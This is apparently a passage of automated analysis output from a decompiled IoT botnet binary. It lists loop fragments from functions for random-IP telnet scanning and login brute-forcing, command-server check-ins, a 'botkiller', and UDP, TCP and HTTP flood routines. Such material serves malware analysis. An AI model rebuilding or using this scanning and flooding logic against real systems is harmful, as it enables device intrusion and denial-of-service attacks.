++++++++ FUNCTION LENGTH 164
    int32_t v152 = close(fd); // 0x12e3c
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 30096
++++++++ FUNCTION END 30310
++++++++ FUNCTION LENGTH 214
    while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 1993 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2025 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2382 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2394 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v155);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 2525 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2537 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v155);
=============================WHILE LOOPS ID : 5 @ prints ====================================
++++++++ WHILE START : 2675 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2687 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v155);
=============================WHILE LOOPS ID : 7 @ print ====================================
++++++++ WHILE START : 3228 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3494 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v155);
		while (true) {
		while (true) {
		int32_t v178 = prints(v152, v175, v166, v160, (int32_t)&v177); // 0x8a5c
		int32_t v180 = printi(v152, v179, 10, 1, v166, v160, 97) + result; // 0x8acc
		int32_t v182 = printi(v152, v181, 16, 0, v166, v160, 97) + result; // 0x8b30
		int32_t v184 = printi(v152, v183, 16, 0, v166, v160, 65) + result; // 0x8b94
		int32_t v187 = printi(v152, v186, 10, 0, v166, v160, 97) + result; // 0x8bf8
		int32_t v190 = prints(v152, (char *)&v154, v166, v160, v188); // 0x8c4c
		printchar(a1, (int32_t)*v155);
=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
++++++++ WHILE START : 4613 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4639 
++++++++ INTRESTING INSTRUCTIONS :  
		v157 = __libc_waitpid(v158, (int32_t)&v156, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v155, 0);
=============================WHILE LOOPS ID : 11 @ getBogos ====================================
++++++++ WHILE START : 5730 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5794 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v154, 0x1000, v152, v154) == 0) {
		__libc_close(v152);
		uppercase((char *)&v153);
		if (strstr(v154, "BOGOMIPS") == v154) {
		while (true) {
		while (true) {
		__libc_close(v152);
=============================WHILE LOOPS ID : 12 @ getCores ====================================
++++++++ WHILE START : 5956 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 5975 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v153, 0x1000, v154, v153) == 0) {
		__libc_close(v154);
		uppercase((char *)&v152);
		if (strstr(v153, "BOGOMIPS") == v153) {
=============================WHILE LOOPS ID : 13 @ recvLine ====================================
++++++++ WHILE START : 6322 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6396 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v159, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v159, (int32_t *)&v160, 1, 0, v163) != 1) {
=============================WHILE LOOPS ID : 14 @ recvLine ====================================
++++++++ WHILE START : 6403 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6414 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_recv(v159, (int32_t *)&v160, 1, 0, v163) == 1) {
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 7887 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 7902 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v155, 4 * v154) != 0) {
=============================WHILE LOOPS ID : 16 @ listFork ====================================
++++++++ WHILE START : 8281 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 8301 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
++++++++ WHILE START : 8692 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 8754 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 18 @ readUntil ====================================
++++++++ WHILE START : 8919 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 8999 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v158 = __libc_recv(a1, (int32_t *)v157, 1, 0, v157); // 0xa904
		if (strstr(a6, (char *)a2) == 0) {
		int32_t v159 = __libc_recv(a1, (int32_t *)(v157 + 1), 2, 0, v155); // 0xa96c
=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
++++++++ WHILE START : 11706 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 12210 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		GetRandomPublicIP(24, v154, v166, v168, v168);
		socket();
		if (__libc_connect(*v165, (struct sockaddr *)&v152, 16) == -1) {
		socket();
		case 1: {
		while (true) {
		getsockopt();
		case 2: {
		case 3: {
		if (__libc_send(*v183, (int32_t *)v184, len, 0x4000) < 0) {
		if (__libc_send(*v183, (int32_t *)"\r\n", 2, 0x4000) < 0) {
		case 4: {
		case 5: {
		if (__libc_send(*v188, (int32_t *)v189, len2, 0x4000) < 0) {
		if (__libc_send(*v188, (int32_t *)"\r\n", 2, 0x4000) < 0) {
		case 6: {
		get_telstate_host(v159, v154, v160);
		sockprintf(v194, (int32_t)"LOGIN FOUND - %s:%s:%s");
		case 7: {
		__libc_send(*v195, (int32_t *)"sh\r\n", 4, 0x4000);
		__libc_send(*v195, (int32_t *)"shell\r\n", 7, 0x4000);
		if (__libc_send(*v195, (int32_t *)str3, len3, 0x4000) < 0) {
=============================WHILE LOOPS ID : 24 @ sendSTD ====================================
++++++++ WHILE START : 12411 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 12437 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v152, (int32_t *)v161, 65, 0);
		__libc_connect(v152, (struct sockaddr *)&v154, 16);
		__libc_close(v152);
=============================WHILE LOOPS ID : 25 @ sendUDP ====================================
++++++++ WHILE START : 12628 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12668 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v154, (int32_t *)v155, a5, 0, (int32_t)&v151, 16);
		rand_cmwc();
=============================WHILE LOOPS ID : 26 @ sendUDP ====================================
++++++++ WHILE START : 12735 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12790 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v161, (int32_t *)v169, v166, 0, (int32_t)&v186, (int32_t)&v186);
		*v170 = (char)rand_cmwc();
		v187 = rand_cmwc();
		*(char *)(v169 + 4) = (char)rand_cmwc();
		int32_t v188 = GetRandomIP(v165); // 0xfa20
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 13038 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13122 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v183, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v183, (int32_t)"psh") == 0) {
		sockprintf(v152, (int32_t)"Invalid flag \"%s\"");
=============================WHILE LOOPS ID : 28 @ sendTCP ====================================
++++++++ WHILE START : 13148 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13179 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v151, (int32_t *)v158, v155, 0, (int32_t)&v178, (int32_t)&v178);
		v170 = GetRandomIP(v154);
		*(char *)(v158 + 4) = (char)rand_cmwc();
		*v164 = rand_cmwc();
		*v160 = (char)rand_cmwc();
		*v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, 0) / 0x1000000);
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 13207 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13224 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v151, (int32_t *)v158, v155, 0, (int32_t)&v178, (int32_t)&v178);
		v170 = GetRandomIP(v154);
		*(char *)(v158 + 4) = (char)rand_cmwc();
		*v164 = rand_cmwc();
		*v160 = (char)rand_cmwc();
		*v175 = (char)(0x1000000 * tcpcsum(v158, v159, v159, 0) / 0x1000000);
=============================WHILE LOOPS ID : 30 @ botkiller ====================================
++++++++ WHILE START : 13386 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 13404 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v152);
		__libc_system(v152);
=============================WHILE LOOPS ID : 31 @ sendHTTP ====================================
++++++++ WHILE START : 13729 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 13743 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
=============================WHILE LOOPS ID : 32 @ sendHTTP ====================================
++++++++ WHILE START : 13747 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 13762 
++++++++ INTRESTING INSTRUCTIONS :  
		v157 = socket_connect(a1, a3, (int32_t)a3);
=============================WHILE LOOPS ID : 33 @ sendHTTP2 ====================================
++++++++ WHILE START : 13936 
++++++++ WHILE FUNCTION : sendHTTP2 
++++++++ WHILE END : 13979 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		sprintf(v154, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v156);
		if (__libc_fork() != 0) {
		while (true) {
		if (socket_connect(a2, a3, (int32_t)a3) != 0) {
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 14458 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14473 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v169, v157, v158, v159, v160, v161, v163, v165);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 14608 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14623 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v223, v214, v215, v216, v222, v219, v217);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 14647 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14665 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 14701 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14710 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 14798 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14808 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 14837 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14846 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 14964 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14973 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 15088 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15097 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 50 @ processCmd ====================================
++++++++ WHILE START : 15160 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15177 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v232, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 15206 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15222 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v234, v189, v190, 0);
=============================WHILE LOOPS ID : 52 @ processCmd ====================================
++++++++ WHILE START : 15229 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15279 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v146, (int32_t)"None Killed.");
		sockprintf(v146, (int32_t)"Killed %d.");
		if (*v238 != __libc_getpid()) {
		kill();
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 15417 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15427 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 15454 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15463 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 15550 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15559 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 15644 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15654 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 15681 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15690 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 15777 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15786 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 15891 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15901 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 15928 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15937 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 16024 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16033 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 16118 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16128 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 16155 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16164 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 16246 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16255 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 16296 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16308 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 16354 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16364 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 16391 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16400 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 16447 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16456 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 16501 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16511 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 16538 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16547 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 16594 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16603 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 16668 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16678 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 16705 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16714 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 16761 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16770 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 16815 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16825 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 16852 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16861 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 16908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16917 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 16965 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16977 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 17023 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17033 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 17060 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17069 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 17116 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17125 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 17170 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17180 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 17207 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17216 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 17263 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17272 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v208, v189, v190, 0);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 17337 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 17390 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17400 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v206, v185, v186, 0);
		__libc_close(v146);
=============================WHILE LOOPS ID : 103 @ getOurIP ====================================
++++++++ WHILE START : 17805 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 17912 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v159, 0x1000, v157, v159) != 0) {
		if (strstr(v159, "\t00000000\t") != 0) {
		__libc_close(v157);
		__libc_close(v152);
		__libc_close(v152);
		__libc_close(v157);
		__libc_close(v152);
		__libc_close(v152);
		__libc_close(v157);
		__libc_close(v152);
		__libc_close(v152);
=============================WHILE LOOPS ID : 104 @ main ====================================
++++++++ WHILE START : 18259 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18714 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v165, (int32_t)"\"%s%s\"\n", v160, v163 + len2, (int32_t)&v158, (int32_t)&v158);
		while (true) {
		while (true) {
		fgets((int32_t)&v151, 1024, v147);
		if (__GI_strcasecmp((char *)&v151, v165) == 0) {
		__GI_fclose(v166);
		int32_t v168 = __GI_fopen((int32_t)v148, (int32_t)&v167); // 0x11fc8
		__GI_fclose((char *)v168);
		getOurIP();
		v154 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa(v169);
		sockprintf(v149, (int32_t)"BUILD %s:%s");
		while (true) {
		while (true) {
		if (recvLine(v149, (char *)&v152, 0x1000, v157) == -1) {
		while (true) {
		if (__libc_waitpid(v177, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v157, "PING") == v157) {
		sockprintf(v149, (int32_t)"PONG");
		if (strstr(v157, "DUP") == v157) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n");
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v204, &v164);
		processCmd(v204, &v164);
		while (true) {
		free();
		while (true) {
		if (__libc_waitpid(v177, 0, 1) < 1) {
		getBuild();
		__GI_inet_ntoa(v169);
		sockprintf(v149, (int32_t)"BUILD %s:%s");
		__libc_waitpid(v154, (int32_t)&v150, 0);
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 105 @ main ====================================
++++++++ WHILE START : 18738 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18744 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 106 @ main ====================================
++++++++ WHILE START : 18760 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18766 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 107 @ main ====================================
++++++++ WHILE START : 18790 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18796 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 108 @ main ====================================
++++++++ WHILE START : 18812 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18818 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 109 @ main ====================================
++++++++ WHILE START : 18825 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 18842 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v156, 1024, v212, v156) == 0) {
		fdpclose(v212);
		sockprintf(v149, (int32_t)"%s");
=============================WHILE LOOPS ID : 110 @ __udivsi3 ====================================
++++++++ WHILE START : 19145 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 19357 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 111 @ __umodsi3 ====================================
++++++++ WHILE START : 19704 
++++++++ WHILE FUNCTION : __umodsi3 
++++++++ WHILE END : 20058 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 112 @ __modsi3 ====================================
++++++++ WHILE START : 20290 
++++++++ WHILE FUNCTION : __modsi3 
++++++++ WHILE END : 20670 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 115 @ _vfprintf_internal ====================================
++++++++ WHILE START : 29362 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 30092 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 117 @ _ppfs_setargs ====================================
++++++++ WHILE START : 30656 
++++++++ WHILE FUNCTION : _ppfs_setargs 
++++++++ WHILE END : 30772 
++++++++ INTRESTING INSTRUCTIONS :  
		case 256: {
		case 512: {
=============================WHILE LOOPS ID : 119 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 31158 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 31936 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 124 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 33159 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 33233 
++++++++ INTRESTING INSTRUCTIONS :  
		if ((char)getc_unlocked((char *)a3) == -1) {
=============================WHILE LOOPS ID : 128 @ __GI_strchr ====================================
++++++++ WHILE START : 34779 
++++++++ WHILE FUNCTION : __GI_strchr 
++++++++ WHILE END : 34867 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 136 @ strstr ====================================
++++++++ WHILE START : 35837 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 35953 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 137 @ __xpg_strerror_r ====================================
++++++++ WHILE START : 36282 
++++++++ WHILE FUNCTION : __xpg_strerror_r 
++++++++ WHILE END : 36352 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 139 @ strcasestr ====================================
++++++++ WHILE START : 36761 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 36811 
